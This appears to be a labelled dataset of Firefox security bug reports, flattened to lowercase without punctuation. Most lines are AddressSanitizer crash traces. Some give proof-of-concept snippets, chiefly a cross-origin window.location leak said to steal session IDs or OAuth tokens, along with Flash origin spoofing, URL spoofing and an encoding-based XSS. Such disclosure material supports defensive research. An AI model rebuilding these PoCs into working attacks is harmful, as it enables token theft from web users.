moz_xmalloc memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:200 3 in gfxfcfontset getfontat unsigned int gfxfontstyle const gfx/thebes/gfxpangofonts.cpp:1203 4 in gfxpangofontgroup getbasefontset gfx/thebes/gfxpangofonts.cpp:2503 5 in gfxpangofontgroup getbasefont gfx/thebes/gfxpangofonts.cpp:1936 6 in gfxpangofontgroup getfontat int gfx/thebes/gfxpangofonts.cpp:1954 7 in nsfontmetrics getmetrics const gfx/src/nsfontmetrics.cpp:128 8 in nsfontmetrics externalleading gfx/src/nsfontmetrics.cpp:191 9 in getnormallineheight nsfontmetrics layout/generic/nshtmlreflowstate.cpp:2331 10 in computelineheight nsstylecontext int float layout/generic/nshtmlreflowstate.cpp:2389 11 in nshtmlreflowstate calclineheight nsstylecontext int float layout/generic/nshtmlreflowstate.cpp:2411 12 in nshtmlreflowstate calclineheight const layout/generic/nshtmlreflowstate.cpp:2400 13 in nsblockreflowstate layout/generic/nsblockreflowstate.cpp:113 14 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsblockframe.cpp:998 15 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate layout/generic/nsblockreflowcontext.cpp:268 16 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:3090 17 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:2473 18 in nsblockframe reflowdirtylines nsblockreflowstate layout/generic/nsblockframe.cpp:1993 19 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsblockframe.cpp:1045 20 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate layout/generic/nsblockreflowcontext.cpp:268 21 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:3090 22 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool layout/generic/nsblockframe.cpp:2473 23 in nsblockframe reflowdirtylines nsblockreflowstate layout/generic/nsblockframe.cpp:1993 24 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int layout/generic/nsblockframe.cpp:1045 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 252m malloced 278m for red zones by 421919 calls stats 43m realloced by 24773 calls stats 228m freed by 300591 calls stats 96m really freed by 189262 calls stats 492m 126043 full pages mmaped in 123 calls mmaps by size class 8:294894 9:32764 10:12285 11:14329 12:3072 13:1536 14:1280 15:256 16:1152 17:1280 18:144 19:40 20:24 mallocs by size class 8:351457 9:34855 10:9666 11:16641 12:2693 13:1915 14:1554 15:317 16:1289 17:1310 18:159 19:41 20:22 frees by size class 8:246111 9:26679 10:6463 11:13396 12:1839 13:1717 14:1390 15:267 16:1233 17:1294 18:144 19:39 20:19 rfrees by size class 8:165441 9:9318 10:2157 11:8872 12:662 13:589 14:588 15:146 16:1045 17:414 18:25 19:4 20:1 stats malloc large 1532 small slow 2354 6069 aborting	11
out-of-bounds read in clusteriterator nextcluster reproduces on trunk by double-clicking anywhere in the content window 11059 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in clusteriterator nextcluster layout/generic/nstextframethebes.cpp:6659 1 in nstextframe peekoffsetword bool bool bool int nsiframe peekwordstate layout/generic/nstextframethebes.cpp:6733 2 in nsiframe peekoffset nspeekoffsetstruct layout/generic/nsframe.cpp:6226 3 in nsframe peekbackwardandforward nsselectionamount nsselectionamount int nsprescontext bool unsigned int layout/generic/nsframe.cpp:2954 4 in nsframe selectbytypeatpoint nsprescontext nspoint const nsselectionamount nsselectionamount unsigned int layout/generic/nsframe.cpp:2862 5 in nsframe handlemultiplepress nsprescontext nsguievent nseventstatus bool layout/generic/nsframe.cpp:2911 6 in nsframe handlepress nsprescontext nsguievent nseventstatus layout/generic/nsframe.cpp:2710 7 in nsframe handleevent nsprescontext nsguievent nseventstatus layout/generic/nsframe.cpp:2401 8 in nspresshelleventcb handleevent nseventchainpostvisitor layout/base/nspresshell.cpp:491 9 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher content/events/src/nseventdispatcher.cpp:362 10 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray nsidomeventtarget content/events/src/nseventdispatcher.cpp:629 11 in presshell handleeventinternal nsevent nseventstatus layout/base/nspresshell.cpp:6437 12 in presshell handlepositionedevent nsiframe nsguievent nseventstatus layout/base/nspresshell.cpp:6208 13 in presshell handleevent nsiframe nsguievent bool nseventstatus layout/base/nspresshell.cpp:6007 14 in nsviewmanager dispatchevent nsguievent nsiview nseventstatus view/src/nsviewmanager.cpp:767 15 in nsview handleevent nsguievent bool view/src/nsview.cpp:1062 16 in non-virtual thunk to nsview handleevent nsguievent bool 17 in nswindow dispatchevent nsguievent nseventstatus widget/gtk2/nswindow.cpp:458 18 in nswindow onbuttonpressevent gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:2729 19 in button_press_event_cb gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:5256 20 in 0 is located 1 bytes to the right of 10-byte region allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 2 in nstarrayinfallibleallocator malloc unsigned long dist/include/nstarray.h:60 3 in nstarray_base nstarraydefaultallocator ensurecapacity unsigned int unsigned int dist/include/nstarray-inl.h:119 4 in nstarray bool nstarraydefaultallocator appendelements unsigned int dist/include/nstarray.h:902 5 in clusteriterator layout/generic/nstextframethebes.cpp:6683 6 in nstextframe peekoffsetword bool bool bool int nsiframe peekwordstate layout/generic/nstextframethebes.cpp:6731 7 in nsiframe peekoffset nspeekoffsetstruct layout/generic/nsframe.cpp:6226 8 in nsframe peekbackwardandforward nsselectionamount nsselectionamount int nsprescontext bool unsigned int layout/generic/nsframe.cpp:2954 9 in nsframe selectbytypeatpoint nsprescontext nspoint const nsselectionamount nsselectionamount unsigned int layout/generic/nsframe.cpp:2862 10 in nsframe handlemultiplepress nsprescontext nsguievent nseventstatus bool layout/generic/nsframe.cpp:2911 11 in nsframe handlepress nsprescontext nsguievent nseventstatus layout/generic/nsframe.cpp:2710 12 in nsframe handleevent nsprescontext nsguievent nseventstatus layout/generic/nsframe.cpp:2401 13 in nspresshelleventcb handleevent nseventchainpostvisitor layout/base/nspresshell.cpp:491 14 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher content/events/src/nseventdispatcher.cpp:362 15 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray nsidomeventtarget content/events/src/nseventdispatcher.cpp:629 16 in presshell handleeventinternal nsevent nseventstatus layout/base/nspresshell.cpp:6437 17 in presshell handlepositionedevent nsiframe nsguievent nseventstatus layout/base/nspresshell.cpp:6208 18 in presshell handleevent nsiframe nsguievent bool nseventstatus layout/base/nspresshell.cpp:6007 19 in nsviewmanager dispatchevent nsguievent nsiview nseventstatus view/src/nsviewmanager.cpp:767 20 in nsview handleevent nsguievent bool view/src/nsview.cpp:1062 21 in non-virtual thunk to nsview handleevent nsguievent bool 22 in nswindow dispatchevent nsguievent nseventstatus widget/gtk2/nswindow.cpp:458 23 in nswindow onbuttonpressevent gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:2729 24 in button_press_event_cb gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:5256 shadow byte and word 2 00 02 fb fb fb fb fb fb more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 02 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa stats 247m malloced 270m for red zones by 396757 calls stats 42m realloced by 23311 calls stats 223m freed by 275477 calls stats 90m really freed by 187533 calls stats 480m 122969 full pages mmaped in 120 calls mmaps by size class 8:294894 9:32764 10:8190 11:14329 12:2048 13:1536 14:1280 15:256 16:1152 17:1280 18:144 19:40 20:20 mallocs by size class 8:330117 9:32695 10:8737 11:16289 12:2501 13:1727 14:1555 15:317 16:1287 17:1317 18:154 19:40 20:21 frees by size class 8:224898 9:24420 10:5483 11:13159 12:1629 13:1507 14:1392 15:267 16:1231 17:1301 18:134 19:38 20:18 rfrees by size class 8:164815 9:8613 10:2103 11:8730 12:630 13:557 14:541 15:144 16:1042 17:328 18:25 19:4 20:1 stats malloc large 1532 small slow 2246 11059 aborting	11
cross domain access to the location object function poc var win window.open newwin width=200 height=200 settimeout function alert hello https twitter.com exec win.location 1 5000 i ca n't reproduce in 15 or trunk but 16 is affected	5
location can be spoofed using valueof when adobe flash player checks the page location to apply the sop it reads the return value of javascript top.location flashplugin_unique when an object is joined with a string its valueof method is called before tostring and content can redefine the former this appears to have regressed in firefox v16.0.1	9
out-of-bounds-read in nscodingstatemachine nextstate reproduces on trunk open the testcase and change character encoding view character encoding auto-detect east asian 32448 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 4 at thread t27 0 in nscodingstatemachine nextstate char extensions/universalchardet/src/base/nscodingstatemachine.h:37 1 in nsesccharsetprober handledata char const unsigned int extensions/universalchardet/src/base/nsesccharsetprober.cpp:56 2 in nsuniversaldetector handledata char const unsigned int extensions/universalchardet/src/base/nsuniversaldetector.cpp:169 3 in nsxpcomdetector doit char const unsigned int bool extensions/universalchardet/src/xpcom/nsudetxpcomwrapper.cpp:57 4 in non-virtual thunk to nsxpcomdetector doit char const unsigned int bool 5 in nshtml5streamparser finalizesniffing unsigned char const unsigned int unsigned int unsigned int parser/html/nshtml5streamparser.cpp:584 6 in nshtml5streamparser dostoprequest parser/html/nshtml5streamparser.cpp:1001 7 in nshtml5requeststopper run parser/html/nshtml5streamparser.cpp:1027 8 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 9 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 10 in nsthread threadfunc void xpcom/threads/nsthread.cpp:256 11 in pt_root nsprpub/pr/src/pthreads/ptthread.c:156 12 in asan asanthread threadstart is located 0 bytes to the right of global variable iso2022jpcharlentable extensions/universalchardet/src/base/nsescsm.cpp of size 32 iso2022jpcharlentable extensions/universalchardet/src/base/nsescsm.cpp is ascii string shadow byte and word f9 00 00 00 00 f9 f9 f9 f9 more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 00 00 00 00 00 00 00 00 04 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 f9 f9 f9 f9 00 00 00 00 00 04 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 thread t27 created by t0 here 0 in interceptor_pthread_create 1 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:393 2 in pr_createthread nsprpub/pr/src/pthreads/ptthread.c:476 3 in nsthread init xpcom/threads/nsthread.cpp:322 4 in nsthreadmanager newthread unsigned int unsigned int nsithread xpcom/threads/nsthreadmanager.cpp:215 5 in ns_newthread_p nsithread nsirunnable unsigned int objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:49 6 in tag_nsresult ns_newnamedthread_p 13ul char const 13ul nsithread nsirunnable unsigned int dist/include/nsthreadutils.h:88 7 in nshtml5module getstreamparserthread parser/html/nshtml5module.cpp:118 8 in nshtml5streamparser parser/html/nshtml5streamparser.cpp:164 9 in nshtml5parser markasnotscriptcreated char const parser/html/nshtml5parser.cpp:575 10 in nshtmldocument startdocumentload char const nsichannel nsiloadgroup nsisupports nsistreamlistener bool nsicontentsink content/html/document/src/nshtmldocument.cpp:629 11 in nscontentdlf createdocument char const nsichannel nsiloadgroup nsisupports nsid const nsistreamlistener nsicontentviewer layout/build/nscontentdlf.cpp:413 12 in nscontentdlf createinstance char const nsichannel nsiloadgroup char const nsisupports nsisupports nsistreamlistener nsicontentviewer layout/build/nscontentdlf.cpp:207 13 in nsdocshell newcontentviewerobj char const nsirequest nsiloadgroup nsistreamlistener nsicontentviewer docshell/base/nsdocshell.cpp:7927 14 in nsdocshell createcontentviewer char const nsirequest nsistreamlistener docshell/base/nsdocshell.cpp:7732 15 in nsdsuricontentlistener docontent char const bool nsirequest nsistreamlistener bool docshell/base/nsdsuricontentlistener.cpp:122 16 in nsdocumentopeninfo trycontentlistener nsiuricontentlistener nsichannel uriloader/base/nsuriloader.cpp:654 17 in nsdocumentopeninfo dispatchcontent nsirequest nsisupports uriloader/base/nsuriloader.cpp:356 18 in nsdocumentopeninfo onstartrequest nsirequest nsisupports uriloader/base/nsuriloader.cpp:248 19 in nsbasechannel onstartrequest nsirequest nsisupports netwerk/base/src/nsbasechannel.cpp:740 20 in non-virtual thunk to nsbasechannel onstartrequest nsirequest nsisupports 21 in nsinputstreampump onstatestart netwerk/base/src/nsinputstreampump.cpp:417 22 in nsinputstreampump oninputstreamready nsiasyncinputstream netwerk/base/src/nsinputstreampump.cpp:368 23 in non-virtual thunk to nsinputstreampump oninputstreamready nsiasyncinputstream 24 in nsinputstreamreadyevent run xpcom/io/nsstreamutils.cpp:82 25 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 26 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 27 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 28 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:215 29 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:208 30 in messageloop run ipc/chromium/src/base/message_loop.cc:182 31 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 32 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:290 33 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3792 34 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3858 35 in xre_main toolkit/xre/nsapprunner.cpp:3933 36 in do_main int char browser/app/nsbrowserapp.cpp:174 37 in main browser/app/nsbrowserapp.cpp:279 38 in 0 stats 96m malloced 135m for red zones by 337281 calls stats 4m realloced by 18985 calls stats 73m freed by 210542 calls stats 0m really freed by 0 calls stats 268m 68645 full pages mmaped in 67 calls mmaps by size class 8:311277 9:32764 10:12285 11:8188 12:3072 13:1536 14:768 15:256 16:704 17:96 18:144 19:8 20:8 mallocs by size class 8:288647 9:26533 10:10394 11:6886 12:2044 13:1166 14:533 15:162 16:694 17:81 18:129 19:6 20:6 frees by size class 8:178460 9:17981 10:7052 11:3628 12:1110 13:952 14:391 15:125 16:655 17:74 18:106 19:4 20:4 rfrees by size class stats malloc large 222 small slow 1511 32448 aborting	11
out-of-bounds-read in mozilla image rasterimage drawframeto the asan-report from this bug looks almost identical to which should be fixed i also tried the repro-files from the earlier bug but those do n't cause crash anymore tested with build from choller/firefox/asan/20121013-mozilla-central-linux64-debug-0be7bfea4744+asan.html to reproduce open the attached gif-image with asan built firefox did n't affect firefox 16.0.1 official-build asan-report 11528 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in mozilla image rasterimage drawframeto imgframe imgframe nsintrect builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:2173 1 in mozilla image rasterimage docomposite nsintrect imgframe imgframe int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:1979 2 in mozilla image rasterimage advanceframe mozilla timestamp nsintrect builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:442 3 in mozilla image rasterimage requestrefresh mozilla timestamp const builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:485 4 in nsrefreshdriver imagerequestenumerator nsisupportshashkey void builds/slave/try-lnx64-dbg/build/layout/base/nsrefreshdriver.cpp:469 5 in pl_dhashtableenumerate builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/pldhash.cpp:716 6 in nsthashtable nsisupportshashkey enumerateentries pldhashoperator nsisupportshashkey void void builds/slave/try-lnx64-dbg/build dist/include/nsthashtable.h:237 7 in nsrefreshdriver notify nsitimer builds/slave/try-lnx64-dbg/build/layout/base/nsrefreshdriver.cpp:417 8 in nstimerimpl fire builds/slave/try-lnx64-dbg/build/xpcom/threads/nstimerimpl.cpp:475 9 in nstimerevent run builds/slave/try-lnx64-dbg/build/xpcom/threads/nstimerimpl.cpp:555 10 in nsthread processnextevent bool bool builds/slave/try-lnx64-dbg/build/xpcom/threads/nsthread.cpp:612 11 in ns_processnextevent_p nsithread bool builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsthreadutils.cpp:220 12 in mozilla ipc messagepump run base messagepump delegate builds/slave/try-lnx64-dbg/build/ipc/glue/messagepump.cpp:82 13 in messageloop runinternal builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:215 14 in messageloop run builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:182 15 in nsbaseappshell run builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsbaseappshell.cpp:163 16 in nsappstartup run builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsappstartup.cpp:290 17 in xremain xre_mainrun builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3792 18 in xremain xre_main int char nsxreappdata const builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3858 19 in xre_main builds/slave/try-lnx64-dbg/build/toolkit/xre/nsapprunner.cpp:3933 20 in do_main int char builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:174 21 in main builds/slave/try-lnx64-dbg/build/browser/app/nsbrowserapp.cpp:279 22 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 is located 27 bytes to the right of 33-byte region allocated by thread t0 here 0 in interceptor_malloc 0 1 in imgframe init int int int int gfxasurface gfximageformat unsigned char builds/slave/try-lnx64-dbg/build/image/src/imgframe.cpp:169 2 in mozilla image rasterimage internaladdframe unsigned int int int int int gfxasurface gfximageformat unsigned char unsigned char unsigned int unsigned int unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:1110 3 in mozilla image rasterimage ensureframe unsigned int int int int int gfxasurface gfximageformat unsigned char unsigned char unsigned int unsigned int unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:1232 4 in mozilla image nsgifdecoder2 beginimageframe unsigned short builds/slave/try-lnx64-dbg/build/image/decoders/nsgifdecoder2.cpp:185 5 in mozilla image nsgifdecoder2 writeinternal char const unsigned int builds/slave/try-lnx64-dbg/build/image/decoders/nsgifdecoder2.cpp:956 6 in mozilla image rasterimage writetodecoder char const unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:2478 7 in mozilla image rasterimage decodesomedata unsigned int builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:3086 8 in mozilla image rasterimage decodeworker decodesomeofimage mozilla image rasterimage mozilla image rasterimage decodeworker decodetype builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:3398 9 in mozilla image rasterimage sourcedatacomplete builds/slave/try-lnx64-dbg/build/image/src/rasterimage.cpp:1672 10 in imgrequest onstoprequest nsirequest nsisupports tag_nsresult builds/slave/try-lnx64-dbg/build/image/src/imgrequest.cpp:582 11 in mozilla dom mediadocumentstreamlistener onstoprequest nsirequest nsisupports tag_nsresult builds/slave/try-lnx64-dbg/build/content/html/document/src/mediadocument.cpp:67 12 in nsdocumentopeninfo onstoprequest nsirequest nsisupports tag_nsresult builds/slave/try-lnx64-dbg/build/uriloader/base/nsuriloader.cpp:293 13 in nsbasechannel onstoprequest nsirequest nsisupports tag_nsresult builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsbasechannel.cpp:757 14 in non-virtual thunk to nsbasechannel onstoprequest nsirequest nsisupports tag_nsresult builds/slave/try-lnx64-dbg/build/media/libvpx/vp8/encoder/x86/quantize_mmx.asm:0 15 in nsinputstreampump onstatestop builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsinputstreampump.cpp:552 16 in nsinputstreampump oninputstreamready nsiasyncinputstream builds/slave/try-lnx64-dbg/build/netwerk/base/src/nsinputstreampump.cpp:374 17 in nsinputstreamreadyevent run builds/slave/try-lnx64-dbg/build/xpcom/io/nsstreamutils.cpp:82 18 in nsthread processnextevent bool bool builds/slave/try-lnx64-dbg/build/xpcom/threads/nsthread.cpp:612 19 in ns_processnextevent_p nsithread bool builds/slave/try-lnx64-dbg/build/obj-firefox/xpcom/build/nsthreadutils.cpp:220 20 in mozilla ipc messagepump run base messagepump delegate builds/slave/try-lnx64-dbg/build/ipc/glue/messagepump.cpp:82 21 in messageloop runinternal builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:215 22 in messageloop run builds/slave/try-lnx64-dbg/build/ipc/chromium/src/base/message_loop.cc:182 23 in nsbaseappshell run builds/slave/try-lnx64-dbg/build/widget/xpwidgets/nsbaseappshell.cpp:163 24 in nsappstartup run builds/slave/try-lnx64-dbg/build/toolkit/components/startup/nsappstartup.cpp:290 shadow byte and word fb 00 00 00 00 01 fb fb fb more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 01 fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 stats 225m malloced 243m for red zones by 348346 calls stats 33m realloced by 21083 calls stats 197m freed by 224732 calls stats 63m really freed by 132000 calls stats 448m 114771 full pages mmaped in 112 calls mmaps by size class 8:245745 9:32764 10:16380 11:12282 12:3072 13:1536 14:1280 15:256 16:512 17:1280 18:192 19:40 20:20 mallocs by size class 8:274234 9:34150 10:18865 11:12880 12:2580 13:1750 14:1449 15:269 16:634 17:1280 18:198 19:37 20:20 frees by size class 8:170193 9:23848 10:14205 11:9794 12:1575 13:1564 14:1294 15:223 16:565 17:1267 18:150 19:36 20:18 rfrees by size class 8:108284 9:8216 10:7581 11:5595 12:528 13:477 14:478 15:100 16:346 17:384 18:6 19:4 20:1 stats malloc large 1535 small slow 1841 11528 aborting	11
eats a char near chunk delimiter in hz-gb-2312 encoding user agent mozilla/5.0 windows nt 6.0 rv:16.0 gecko/20100101 firefox/16.0 build id 20121010144125 steps to reproduce in hz-gb-2312 encoding eats a char near chunk delimiter this behavior is firefox only this leads to xss attack 20123 also this has potential risk of bug 690225 expected results should not eat character	9
url spoofing with credentials info of url 204 user agent mozilla/5.0 windows nt 6.0 rv:16.0 gecko/20100101 firefox/16.0 build id 20121010144125 steps to reproduce 1 go to attachment file and click go button 2 address bar points google.com but in fact it is not google.com expected results firefox should display url correctly	1
more cross origin location access problems user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.4 khtml like gecko chrome/22.0.1229.94 safari/537.4 steps to reproduce firefox 16.0.0 suffered from a nasty bug allowing cross-origin access to window.location which can be easily exploited to steal session ids or oauth tokens on many websites including high profile ones even though 16.0.1 fiexed the immediate bug this called into question the effectiveness of the wrappers intended to protect the location object our research team prosecco at inria paris is currently building formal analysis tools for javascript and while investigating the wrapped native prototype and global scope polluter implementation we found that they suffered from a bottom-up property injection by prototype that can be exploited to recover cross-origin locations the following minimal exploit should be self-explanatory html head script type text/javascript window.onload function f document.getelementbyid f loc f.contentwindow.location loc2 tostring loc.tostring loc2.__proto f.contentwindow.location f.src script head body iframe id f src about blank iframe input type button onclick alert loc2.tostring value get url body html actual results clicking the get url button reveals the current and complete location of the frame expected results as soon as the frame s location was changed to mozilla.com access to the location should have been impossible	5
crash in copyteximage2d with image dimensions too large for given level similar to on intel copyteximage2d with a level of 9 or 10 and width and height that when multiplied come close to 2 level causes crashes 3424 error addresssanitizer crashed on unknown address pc sp bp t0 3455 error addresssanitizer crashed on unknown address pc sp bp t0 3484 error addresssanitizer crashed on unknown address pc sp bp t0 3673 error addresssanitizer crashed on unknown address pc sp bp t0 3703 error addresssanitizer crashed on unknown address pc sp bp t0 3893 error addresssanitizer crashed on unknown address pc sp bp t0	11
heap-use-after-free in nsviewmanager processpendingupdates reproduces on trunk 12412 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsviewmanager processpendingupdates view/src/nsviewmanager.cpp:1212 1 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:475 2 in nstimerevent run xpcom/threads/nstimerimpl.cpp:555 3 in ns_processnextevent_p nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:220 4 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 5 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:215 6 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 7 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3858 8 in xre_main toolkit/xre/nsapprunner.cpp:3933 9 in do_main int char browser/app/nsbrowserapp.cpp:174 10 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 is located 40 bytes inside of 64-byte region freed by thread t0 here 0 in free 1 in nsviewmanager release view/src/nsviewmanager.cpp:125 2 in nsdocshell destroy docshell/base/nsdocshell.cpp:4897 3 in non-virtual thunk to nsdocshell destroy 0 4 in nswebshellwindow destroy xpfe/appshell/src/nswebshellwindow.cpp:750 5 in nsglobalwindow reallyclosewindow dom/base/nsglobalwindow.cpp:6734 6 in nsglobalwindow finalclose dom/base/nsglobalwindow.cpp:6681 7 in nsglobalwindow close dom/base/nsglobalwindow.cpp:6624 8 in nsglobalwindow close dom/base/nsglobalwindow.cpp:6559 9 in ns_invokebyindex_p xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 10 in callmethodhelper invoke js/xpconnect/src/xpcwrappednative.cpp:3108 11 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1488 12 in jsfunction native const js/src/jscntxtinlines.h:364 13 in js invoke jscontext js invokeargsguard js maybeconstruct js/src/jsinterp.h:109 14 in js indirectproxyhandler call jscontext jsobject unsigned int js value js/src/jsproxy.cpp:450 15 in js directwrapper call jscontext jsobject unsigned int js value js/src/jswrapper.cpp:390 16 in non-virtual thunk to js crosscompartmentwrapper call jscontext jsobject unsigned int js value 17 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:364 18 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:2370 19 in js runscript jscontext js handle jsscript js stackframe js/src/jsinterp.cpp:324 20 in js invokekernel jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:378 21 in js invoke jscontext js invokeargsguard js maybeconstruct js/src/jsinterp.h:109 22 in jsfunction native const js/src/jscntxtinlines.h:364 23 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:2370 24 in js runscript jscontext js handle jsscript js stackframe js/src/jsinterp.cpp:324 25 in js invokekernel jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:378 26 in js invoke jscontext js invokeargsguard js maybeconstruct js/src/jsinterp.h:109 27 in js indirectproxyhandler call jscontext jsobject unsigned int js value js/src/jsproxy.cpp:450 28 in js directwrapper call jscontext jsobject unsigned int js value js/src/jswrapper.cpp:390 29 in non-virtual thunk to js crosscompartmentwrapper call jscontext jsobject unsigned int js value previously allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 01 fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd stats 289m malloced 302m for red zones by 407162 calls stats 35m realloced by 20307 calls stats 252m freed by 260279 calls stats 121m really freed by 107074 calls stats 500m 128096 full pages mmaped in 125 calls mmaps by size class 8:262128 9:32764 10:12285 11:12282 12:3072 13:2048 14:1280 15:256 16:576 17:1280 18:288 19:40 20:32 21:4 mallocs by size class 8:326930 9:43810 10:12490 11:13674 12:3072 13:2374 14:1671 15:339 16:815 17:1616 18:297 19:40 20:31 21:3 frees by size class 8:201346 9:31687 10:7929 11:10578 12:2184 13:2179 14:1470 15:284 16:725 17:1600 18:228 19:39 20:27 21:3 rfrees by size class 8:79435 9:13591 10:2500 11:7030 12:870 13:866 14:1033 15:156 16:460 17:1116 18:11 19:5 20:1 stats malloc large 1987 small slow 2137	11
